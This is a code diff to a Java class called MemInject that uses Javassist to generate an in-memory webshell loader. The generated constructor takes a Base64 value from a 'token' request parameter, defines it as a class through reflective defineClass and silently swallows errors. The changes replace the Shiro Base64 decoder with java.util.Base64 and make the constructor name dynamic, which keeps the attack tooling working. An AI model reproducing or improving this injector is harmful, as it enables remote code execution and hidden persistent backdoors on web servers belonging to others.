@@ -35,7 +35,8 @@ public class MemInject {
                 "        return f.get(o);\n" +
                 "}", clazz));
 
-        clazz.addConstructor(CtNewConstructor.make("    public InjectMemTool() {\n" +
+        // 构造函数名使用动态类名，通过 $this 获取
+        clazz.addConstructor(CtNewConstructor.make("    public " + clazz.getSimpleName() + "() {\n" +
                 "        try {\n" +
                 "            Object o;\n" +
                 "            String s;\n" +
@@ -72,7 +73,7 @@ public class MemInject {
                 "                        user = (String) conreq.getClass().getMethod(\"getParameter\", new Class[]{String.class}).invoke(conreq, new Object[]{new String(\"token\")});\n" +
                 "\n" +
                 "                        if (user != null && !user.isEmpty()) {\n" +
-                "                            byte[] bytecodes = org.apache.shiro.codec.Base64.decode(user);\n" +
+                "                            byte[] bytecodes = java.util.Base64.getDecoder().decode(user);\n" +
                 "\n" +
                 "                            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
                 "                            defineClassMethod.setAccessible(true);\n" +
@@ -91,7 +92,7 @@ public class MemInject {
                 "        } catch (Exception e) {\n" +
                 "            ;\n" +
                 "        }\n" +
-                "}", clazz));
+                "    }", clazz));
 
         return clazz;
     }
